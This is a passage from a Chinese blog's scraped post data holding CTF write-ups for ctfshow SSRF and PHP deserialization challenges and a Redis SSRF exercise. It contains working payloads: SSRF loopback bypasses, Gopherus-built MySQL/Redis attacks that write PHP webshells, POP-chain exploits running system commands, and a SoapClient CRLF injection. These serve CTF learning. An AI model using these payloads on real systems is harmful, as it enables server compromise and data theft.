redis环境信息被愉快的打印出来 依次获取 redis 的键和值即可 获取所有键 1xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_KEYS%2520*%250a&quot;); 读取结果 12345*1$4flag 判断flag键的值类型 1xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_type%2520flag%250a&quot;); 读取结果 1+list 获取flag键的所有列表值 1xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%2520-1%250a&quot;); 把结果复制进字符串 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221s = &quot;&quot;&quot;*53$1&#125;$1t$1i$1o$1l$1p$1x$1e$1 $1o$1t$1 $1y$1s$1a$1e$1 $1s$1i$1 $1n$1o$1i$1t$1a$1c$1i$1t$1n$1e$1h$1t$1u$1a$1 $1t$1u$1o$1h$1t$1i$1w$1 $1s$1i$1d$1e$1R$1&#123;$1G$1A$1L$1F&quot;&quot;&quot;flag = &#x27;&#x27;for c in s: flag += cprint(flag[::-1].replace(&quot;1$&quot;, &quot;&quot;).replace(&quot;\\n&quot;, &quot;&quot;)) 结果在去除最后三个字符 35* 即可 1FLAG&#123;Redis without authentication is easy to exploit&#125; 虽然生产环境利用起来相对困难，不过毕竟是CTF嘛，骚思路多一个是一个 （ 参考链接 https://skysec.top/2018/08/17/xss-ssrf-redis/","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"hackme","slug":"ctf/hackme","permalink":"https://tari.moe/categories/ctf/hackme/"},{"name":"ctf练习","slug":"ctf/hackme/ctf练习","permalink":"https://tari.moe/categories/ctf/hackme/ctf%E7%BB%83%E4%B9%A0/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf练习","slug":"ctf练习","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"},{"name":"hackme","slug":"hackme","permalink":"https://tari.moe/tags/hackme/"}]},{"title":"ctfshow SSRF篇","slug":"2021/ctfshow-ssrf","date":"2021-04-25T13:14:38.000Z","updated":"2021-05-04T13:50:57.074Z","comments":true,"path":"/p/2021/ctfshow-ssrf/","link":"","permalink":"https://tari.moe/p/2021/ctfshow-ssrf/","excerpt":"","text":"要是多点组合拳，或者条件苛刻些就好了 （ web351 简单认识nginx/1.18.0 PHP/7.3.22 1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; poc 12# POSTurl=http://127.0.0.1/flag.php web352 永远相信美好的事情即将发生nginx/1.18.0 PHP/7.3.22 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|127.0.0/&#x27;))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 分析： 协议必须是 http/https ，但过滤了 localhost 和 127.0.0 poc 1url=http://127.0.0.1/flag.php preg_match 没传参可还行。。因为有 error_reporting(0) ，报错的地方恒为 False… web353 数字绕过nginx/1.18.0 PHP/7.3.22 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|127\\.0\\.|\\。/i&#x27;, $url))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 分析： 协议必须是 http/https ，但过滤了 localhost 和 127.0. 这里有许多绕过 进制绕过 1url=http://0x7F000001/flag.php 0.0.0.0 绕过 1url=http://0.0.0.0/flag.php ipv6绕过 这里不行 特殊地址绕过 123url=http://0/flag.phpurl=http://127.1/flag.phpurl=http://127.0000000000000.001/flag.php 这里有个小知识点 第一个 0 在linux系统中一般会解析成127.0.0.1 ，在windows 和 macos 中一般解析成0.0.0.0 web354 难点的数字绕过nginx/1.18.0 PHP/7.3.22 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;if(!preg_match(&#x27;/localhost|1|0|。/i&#x27;, $url))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 了解到一个好玩的东西 IDNA ，不过这题用不上 https://www.tr0y.wang/2020/08/18/IDN/ 然后又了解到一个有趣的东西， 有免费的 http://sudo.cc/ 可以解析到 127.0.0.1 白嫖。 题外： 虽然也可以用自己的域名或服务器，2333 web355 长度限制nginx/1.18.0 PHP/7.3.22 1234567891011121314151617181920212223&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$host=$x[&#x27;host&#x27;];if((strlen($host)&lt;=5))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 主机名部分长度限制，可以用 http://0/flag.php 也可以用 http://127.1/flag.php web356 长度限制nginx/1.18.0 PHP/7.3.22 1234567891011121314151617181920212223&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$host=$x[&#x27;host&#x27;];if((strlen($host)&lt;=3))&#123;$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 同 web255，只不过短了点 web357 IP过滤器nginx/1.18.0 PHP/7.3.22 12345678910111213141516171819&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;$ip = gethostbyname($x[&#x27;host&#x27;]);echo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br&gt;&#x27;;if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123; die(&#x27;ip!&#x27;);&#125;echo file_get_contents($_POST[&#x27;url&#x27;]);&#125;else&#123; die(&#x27;scheme&#x27;);&#125;?&gt; 分析： 先获取主机名对应的ip，然后用IP过滤器进行过滤 FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1） FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。 即，主机名解析的 IP 不能是保留地址或者是内网 IP。 这时利用公网服务器进行重定向即可，为了以后的题目 fuzz 方便，写好参数 1234567&lt;?php$h_p_p = explode(&quot;@&quot;, $_GET[&#x27;h&#x27;]);$host = $h_p_p[0] or &#x27;127.0.0.1&#x27;;$port = $h_p_p[1] or &#x27;80&#x27;;$path = $h_p_p[2] or &#x27;&#x27;;header(&quot;Location: http://$host:$port/$path&quot;, TRUE, 302);?&gt; web358 白名单正则nginx/1.18.0 PHP/7.3.22 12345678&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$x=parse_url($url);if(preg_match(&#x27;/^http:\\/\\/ctf\\..*show$/i&#x27;,$url))&#123; echo file_get_contents($url);&#125; 分析， 之前一直没分析到这个 parse_url 函数的特性，有些时候有的时候 URL 会长这样 解析时，会把@进行分割，前面是用户，后面是主机名。 web359 打无密码MySQLnginx/1.16.1 PHP/7.3.11 题目提示 打无密码的mysql 为什么是无密码呢？ https://paper.seebug.org/510/ MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。 随便写点东西 Login 一下，然后有个 returl 写个 baidu，发现可以请求 baidu 一般 SSRF 打内网应用主要还是通过协议，比如用的比较多的是 gopher 具体怎么做呢？ 细心的同学可能发现，无论是用 gopher 攻击 redis、mysql、还是 ftp，这些主要都是基于 tcp 协议为主。这和 gopher 协议的基本格式有关 1gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 因为，如果想要打 MySQL 就需要知道 MySQL 通信时的 TCP 数据流，才能知道要怎么和 MySQL 通信，这里可以通过 Wireshark 抓包来分析 可以参考下面链接的 0x02 mysql协议分析部分 https://www.freebuf.com/articles/web/159342.html 不过这里有个更好用的工具 https://github.com/tarunkant/Gopherus 他包含常见的应用 gopher 数据包的格式构造， 原理也是通过 Wireshark 抓包分析，然后写脚本。 1python2 gopherus.py --exploit mysql 依次输入用户和要执行的SQL语句 12Give MySQL username: rootGive query to execute: select &#x27;&lt;?php eval($_GET[c]);?&gt;&#x27; into outfile &#x27;/var/www/html/c.php&#x27;; 当然，除了满足MySQL未授权外，还需要MySQL开启允许导出文件以及知道网站根目录，本漏洞才能成功利用，缺一不可。 这个 /var/www/html 目录是如何知道的呢？应该是爆破的… 生成的 POC 里，_ 字符后面的内容还要 URL编码一次，因为 PHP接收到POST或GET请求数据，会自动进行一次URL解码，然后，比如 %00 解码后，PHP会直接截断。。 最终 POC 然后在 c.php 里面 cat /flag.txt 即可 flag ctfshow{d9cfb450-02d7-4b13-9170-4b9306d01a34} 顺便嫖一下 check.php 代码 （ 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpif(isset($_POST[&#x27;returl&#x27;]))&#123; $url = $_POST[&#x27;returl&#x27;]; if(preg_match(&quot;/file|dict/i&quot;,$url))&#123; die(); &#125; echo _request(&quot;$url&quot;);&#125;function _request($curl,$https=true,$method=&#x27;get&#x27;,$data=null)&#123;$ch=curl_init(); //初始化curl_setopt($ch,CURLOPT_URL,$curl);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);curl_setopt($ch,CURLOPT_HEADER,false);//设置不需要头信息curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);//获取页面内容，但不输出if($https)&#123; curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,FALSE);//不做服务器认证 curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,FALSE);//不做客户端认证&#125;if($method==&#x27;post&#x27;)&#123; curl_setopt($ch, CURLOPT_POST,true);//设置请求是post方式 curl_setopt($ch, CURLOPT_POSTFIELDS, $data);//设置post请求数据 &#125;$str=curl_exec($ch);//执行访问curl_close($ch);//关闭curl，释放资源return $str; &#125;?&gt; https://www.freebuf.com/articles/web/260806.html 当然还可以有其他利用方式，比如构造 POST 请求进行 SQL注入，文件上传等 web360 打Redisnginx/1.18.0 PHP/7.3.22 题目提示 打redis 1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[&#x27;url&#x27;];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; 和上题差不多，也是用 Gopherus 打 redis 1234What do you want?? (ReverseShell/PHPShell): PHPShellGive web root location of server (default is /var/www/html):Give PHP Payload (We have default PHP Shell): &#x27;&lt;?php eval($_GET[c]);?&gt;&#x27; URL编码一下 _ 后面的内容 默认生成的 webshell 在 shell.php 中 发的包会超时，不过没事，shell.php 是会生成的。 最后 cat /flaaag 即可 一些参考的题解 https://www.freebuf.com/articles/web/263512.html","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctfshow","slug":"ctf/ctfshow","permalink":"https://tari.moe/categories/ctf/ctfshow/"},{"name":"ctf练习","slug":"ctf/ctfshow/ctf练习","permalink":"https://tari.moe/categories/ctf/ctfshow/ctf%E7%BB%83%E4%B9%A0/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://tari.moe/tags/ctfshow/"},{"name":"ctf练习","slug":"ctf练习","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"}]},{"title":"ctfshow 反序列化篇","slug":"2021/ctfshow-unserialize","date":"2021-04-06T12:21:40.000Z","updated":"2021-04-25T14:00:44.611Z","comments":true,"path":"/p/2021/ctfshow-unserialize/","link":"","permalink":"https://tari.moe/p/2021/ctfshow-unserialize/","excerpt":"","text":"感觉排序不是很友好..因为难度不是相对递增的 建议顺序 web254-258、web260、web262-web266、web259、web261、web275-276 然后 web277-278 是 Python 反序列化，不过比较简单 最后是 web267-web274 都是框架的反序列化漏洞，分析起来会麻烦些 web267-270 是 Yii 的 CVE 和 绕过，web271-273 是 Laravel 5.7 和 5.8 的反序列化， web274是 thinkphp5.1 的反序列化 框架的反序列化有空会（咕咕预订…）额外写文章复现，23333 web254 PHP类简单认识123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public $isVip=false; public function checkVip()&#123; return $this-&gt;isVip; &#125; public function login($u,$p)&#123; if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p)&#123; $this-&gt;isVip=true; &#125; return $this-&gt;isVip; &#125; public function vipOneKeyGetFlag()&#123; if($this-&gt;isVip)&#123; global $flag; echo &quot;your flag is &quot;.$flag; &#125;else&#123; echo &quot;no vip, no flag&quot;; &#125; &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; $user = new ctfShowUser(); if($user-&gt;login($username,$password))&#123; if($user-&gt;checkVip())&#123; $user-&gt;vipOneKeyGetFlag(); &#125; &#125;else&#123; echo &quot;no vip,no flag&quot;; &#125;&#125; poc 1GET /?username=xxxxxx&amp;password=xxxxxx web255 简单逻辑nginx/1.16.1 PHP/7.3.11 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public $isVip=false; public function checkVip()&#123; return $this-&gt;isVip; &#125; public function login($u,$p)&#123; return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; &#125; public function vipOneKeyGetFlag()&#123; if($this-&gt;isVip)&#123; global $flag; echo &quot;your flag is &quot;.$flag; &#125;else&#123; echo &quot;no vip, no flag&quot;; &#125; &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; $user = unserialize($_COOKIE[&#x27;user&#x27;]); if($user-&gt;login($username,$password))&#123; if($user-&gt;checkVip())&#123; $user-&gt;vipOneKeyGetFlag(); &#125; &#125;else&#123; echo &quot;no vip,no flag&quot;; &#125;&#125; 分析： 即要满足 类成员 isVip 为 true 传入的 username 和 类成员 username 相等 传入的 password 和 类成员 password 相等 username 和 password 已知，反序列化修改 isVip 即可 poc 123456&lt;?phpclass ctfShowUser&#123;&#125;$user = new ctfShowUser();$user-&gt;isVip = true;echo urlencode(serialize($user));?&gt; web256 简单逻辑nginx/1.16.1 PHP/7.3.11 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public $isVip=false; public function checkVip()&#123; return $this-&gt;isVip; &#125; public function login($u,$p)&#123; return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; &#125; public function vipOneKeyGetFlag()&#123; if($this-&gt;isVip)&#123; global $flag; if($this-&gt;username!==$this-&gt;password)&#123; echo &quot;your flag is &quot;.$flag; &#125; &#125;else&#123; echo &quot;no vip, no flag&quot;; &#125; &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; $user = unserialize($_COOKIE[&#x27;user&#x27;]); if($user-&gt;login($username,$password))&#123; if($user-&gt;checkVip())&#123; $user-&gt;vipOneKeyGetFlag(); &#125; &#125;else&#123; echo &quot;no vip,no flag&quot;; &#125;&#125; 分析： 即要满足 类成员 isVip 为 true 传入的 username 和 类成员 username 相等 传入的 password 和 类成员 password 相等 类的 username 和 password 不等（原来是相等的） 因为通过反序列化修改原有数据即可 poc 123456&lt;?php$user = new ctfShowUser();$user-&gt;isVip = true;$user-&gt;username = &#x27;6&#x27;;echo urlencode(serialize($user));?&gt; web257 简单POP链nginx/1.16.1 PHP/7.3.11 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 20:33:07# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123; private $username=&#x27;xxxxxx&#x27;; private $password=&#x27;xxxxxx&#x27;; private $isVip=false; private $class = &#x27;info&#x27;; public function __construct()&#123; $this-&gt;class=new info(); &#125; public function login($u,$p)&#123; return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; &#125; public function __destruct()&#123; $this-&gt;class-&gt;getInfo(); &#125;&#125;class info&#123; private $user=&#x27;xxxxxx&#x27;; public function getInfo()&#123; return $this-&gt;user; &#125;&#125;class backDoor&#123; private $code; public function getInfo()&#123; eval($this-&gt;code); &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; $user = unserialize($_COOKIE[&#x27;user&#x27;]); $user-&gt;login($username,$password);&#125; 分析： 触发 backDoor 即可 poc 1234567891011121314&lt;?phpclass ctfShowUser&#123; public function __construct()&#123; $this-&gt;class=new backDoor(); &#125;&#125;class backDoor&#123; private $code = &#x27;system(&quot;cat ./flag.php&quot;);&#x27;;&#125;$user = new ctfShowUser();echo(urlencode(serialize($user)));?&gt; web258 正则PHP/5.6.40 正则绕过 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-02 17:44:47# @Last Modified by: h1xa# @Last Modified time: 2020-12-02 21:38:56# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123; public $username=&#x27;xxxxxx&#x27;; public $password=&#x27;xxxxxx&#x27;; public $isVip=false; public $class = &#x27;info&#x27;; public function __construct()&#123; $this-&gt;class=new info(); &#125; public function login($u,$p)&#123; return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p; &#125; public function __destruct()&#123; $this-&gt;class-&gt;getInfo(); &#125;&#125;class info&#123; public $user=&#x27;xxxxxx&#x27;; public function getInfo()&#123; return $this-&gt;user; &#125;&#125;class backDoor&#123; public $code; public function getInfo()&#123; eval($this-&gt;code); &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123; if(!preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123; $user = unserialize($_COOKIE[&#x27;user&#x27;]); &#125; $user-&gt;login($username,$password);&#125; 分析： 绕过正则 /[oc]:\\d+:/i , 其实就是 C:数字 或 O:数字 不连续，这里只需让 O:11 不连续即可，比如 O:+11 poc 123456789101112131415&lt;?phpclass ctfShowUser&#123; public function __construct()&#123; $this-&gt;class=new backDoor(); &#125;&#125;class backDoor&#123; public $code = &#x27;system(&quot;cat flag.php&quot;);&#x27;;&#125;$user = new ctfShowUser();$user_replace = preg_replace(&#x27;/([oc]\\:)(\\d+)/i&#x27;, &#x27;$1+$2&#x27;, serialize($user));echo urlencode($user_replace);?&gt; 图中 %2b 为 + 的 url编码 web259 SSRF + CRLF + SoapClientPHP/7.3.11 SSRF CRLF SoapClient index.php 12345678&lt;?phphighlight_file(__FILE__);$vip = unserialize($_GET[&#x27;vip&#x27;]);//vip can get flag one key$vip-&gt;getFlag(); flag.php (大概如下 1234567891011121314&lt;?php$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);array_pop($xff);$ip = array_pop($xff);if($ip!==&#x27;127.0.0.1&#x27;)&#123; die(&#x27;error&#x27;);&#125;else&#123; $token = $_POST[&#x27;token&#x27;]; if($token==&#x27;ctfshow&#x27;)&#123; file_put_contents(&#x27;flag.txt&#x27;,$flag); &#125;&#125; 分析： 不就 XFF伪造？ 估计给的代码是不完整的，还真实 IP 判断，估计大概是这样的 12345678910111213141516171819&lt;?php$flag = &quot;flag_tari&quot;;$xff = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);array_pop($xff);$ip = array_pop($xff);if($_SERVER[&#x27;REMOTE_ADDR&#x27;]===&#x27;127.0.0.1&#x27;)&#123; if($ip!==&#x27;127.0.0.1&#x27;)&#123; die(&#x27;error&#x27;); &#125;else&#123; $token = $_POST[&#x27;token&#x27;]; if($token==&#x27;ctfshow&#x27;)&#123; file_put_contents(&#x27;flag.txt&#x27;,$flag); &#125; &#125;&#125;echo &quot;your ip not 127.0.0.1&quot;; 搜了一波，奇怪的知识增加了，除了XFF，本题还用到 SSRF(SoapClient)+CRLF组合拳，毕竟我们的 index.php 还有用到呢 需要利用 SSRF 访问 flag.php 并构造 XFF 和 POST 数据，SSRF漏洞在哪呢？ SoapClient类 __call 魔术方法 __call() 魔术方法：当调用一个类不存在的方法时候会触发这个魔术方法 当调用 SoapClient 类的 __call() 魔术方法的时候，会发送一个 POST 请求，请求的参数由着 SoapClient 类的一些参数决定。 因此，当我们运行 index.php 的 $vip-&gt;getFlag(); 方法时，会因 SoapClient 不存在 getFlag 方法而调用 __call() 魔术方法，进而发送一个 POST 请求 poc 1234567891011121314151617&lt;?php$post_string = &#x27;token=ctfshow&#x27;;$soap = new SoapClient( null, array( &#x27;uri&#x27;=&gt; &quot;http://127.0.0.1/flag.php&quot;, &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php&#x27;, &#x27;user_agent&#x27;=&gt;&quot;edge\\r\\nX-Forwarded-For:127.0.0.1,127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded&quot;.&quot;\\r\\nContent-Length: &quot;.(string)strlen($post_string).&quot;\\r\\n\\r\\n&quot;.$post_string, // &#x27;user_agent&#x27;=&gt;&quot;edge\\x0D\\x0AX-Forwarded-For:127.0.0.1,127.0.0.1\\x0D\\x0AContent-Type: application/x-www-form-urlencoded&quot;.&quot;\\x0D\\x0AContent-Length: &quot;.(string)strlen($post_string).&quot;\\x0D\\x0A\\x0D\\x0A&quot;.$post_string, ));echo(urlencode(serialize($soap)));?&gt; 这里注意下，包含特殊字符转义的，比如 \\r\\n 要用双引号 &quot; 单引号保持原来的语义的。 warning 没关系 web260 简单正则PHP/5.6.40 123456789&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);if(preg_match(&#x27;/ctfshow_i_love_36D/&#x27;,serialize($_GET[&#x27;ctfshow&#x27;])))&#123; echo $flag;&#125; poc 12345678910&lt;?phpclass ctfShowUser&#123; public $tari = &#x27;ctfshow_i_love_36D&#x27;;&#125;$user = new ctfShowUser();echo(urlencode(serialize($user)));?&gt; (原) web261 SSRF RedisPHP/7.3.11 index.php 12345678&lt;?phphighlight_file(__FILE__);$vip = unserialize($_GET[&#x27;vip&#x27;]);//vip can get flag one key$vip-&gt;getFlag(); 分析： 题目提示：打 Redis，默认端口为 6379 原来的 web261，不知为啥换成了下面这个。 原本的解题思路大概是在 web259 的基础上，构造 POST包去打 redis web261 PHP特性nginx/1.18.0 PHP/7.4.16 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phphighlight_file(__FILE__);class ctfshowvip&#123; public $username; public $password; public $code; public function __construct($u,$p)&#123; $this-&gt;username=$u; $this-&gt;password=$p; &#125; public function __wakeup()&#123; if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123; die(&#x27;error&#x27;); &#125; &#125; public function __invoke()&#123; eval($this-&gt;code); &#125; public function __sleep()&#123; $this-&gt;username=&#x27;&#x27;; $this-&gt;password=&#x27;&#x27;; &#125; public function __unserialize($data)&#123; $this-&gt;username=$data[&#x27;username&#x27;]; $this-&gt;password=$data[&#x27;password&#x27;]; $this-&gt;code = $this-&gt;username.$this-&gt;password; &#125; public function __destruct()&#123; if($this-&gt;code==0x36d)&#123; file_put_contents($this-&gt;username, $this-&gt;password); &#125; &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]); 分析 __wakeup() unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 因这里写着 username 和 password 必须为非空，否则会退出，所以可以考虑要绕过这里 参考 CVE-2016-7124 影响范围 PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 漏洞原理 当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 函数的执行。 但是题目是 PHP 7.4.2 明显不满足要求， 然后guguru了一下比较显眼的 __unserialize 魔术方法，因为没见过 https://www.php.net/manual/en/language.oop5.magic.php#object.unserialize 发现有趣的东西，官方文档是这样介绍的 就当同时存在 __wakeup 和 __unserialize 魔术方法时，只会调用 __unserialize 魔术方法。 仔细观察析构方法，是个弱比较 $this-&gt;code==0x36d 然后 0x36d 的十进制是 877 ，写个小实验 也就是说弱比较 $code 变量前面是 877 就好了，不管后面加了啥字符串，就可以让 $code == 0x36d 成立了。 构造 POC 1234567&lt;?phpclass ctfshowvip&#123; public $username = &quot;877.php&quot;; public $password = &#x27;&lt;?php eval($_GET[c]); ?&gt;&#x27;;&#125;echo urlencode(serialize(new ctfshowvip())); 会生成 877.php 然后 cat /flag_is_here 即可 题外 因为 PHP 底层是用 C语言写的，原本想着用 \\0 作为字符串截断，这样不会拼接 $passwod 字段，然后发现，如果第一个参数有 \\0 ， file_put_contents 会报错。 然后 __invoke 和 __sleep 在这里的用处不太清楚。。 web262 字符逃逸PHP/5.6.40 字符逃逸 index.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-12-03 02:37:19# @Last Modified by: h1xa# @Last Modified time: 2020-12-03 16:05:38# @message.php# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;$f = $_GET[&#x27;f&#x27;];$m = $_GET[&#x27;m&#x27;];$t = 